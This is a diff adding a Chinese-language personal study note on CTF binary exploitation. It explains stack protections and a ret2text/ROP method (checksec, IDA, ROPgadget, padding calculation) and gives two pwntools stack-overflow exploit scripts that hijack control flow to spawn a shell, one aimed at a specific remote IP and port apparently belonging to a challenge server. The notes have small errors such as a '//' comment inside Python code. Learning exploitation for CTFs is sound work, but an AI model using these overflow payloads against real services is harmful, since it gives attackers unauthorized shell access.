@@ -1,0 +1,63 @@
+esp 入棧
+pop eax 出棧
+
+canary 檢測棧溢出
+
+NX 棧不能被執行
+PIE 全局隨機化
+gets函數為棧溢出訊號
+"/bin/sh" 提權
+
+
+ret2text攻擊法
+0. 判斷32位64位 file -b
+1. 查保護 ex: Canary, NX, PIE => checksec --file=./filename 或 checksec ./filename
+2. 拖進IDA
+3. 按下F5，找到可疑的func，包含不安全的輸入
+4. shift+F12，找可能觸發終端的方式
+5. 計算偏移量，編寫payload
+
+**padding的計算方法**
+對於32位元的程式 
+只需要`(rbp+4個垃圾數據)+binsh_addr+system_addr`
+64位元的的需要(rbp+8個垃圾數據) + rdi_ret + binsh_addr + system_addr
+其中rdi_ret透過
+ROPgadget --binary x64 --only "pop|ret" 
+這個指令尋找
+```
+from pwn import *
+
+//io = process('./target')
+io = remote('ip', port)
+
+getshell_addr = 0x0804859b
+
+padding = 4 + 9
+
+payload = b'a' * padding + p32(getshell_addr)
+
+io.sendline(payload)
+
+io.interactive()
+
+```python
+```
+from pwn import *
+
+
+io = remote('1.95.36.136', 2079)
+# io = process('./x64')
+padding = 0x80 + 8
+
+rdi_ret = 0x00000000004007e3
+system_addr = 0x400560
+binsh_addr = 0x601060
+
+payload = b'a' * padding + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+6. 找出在終端裡找到flag
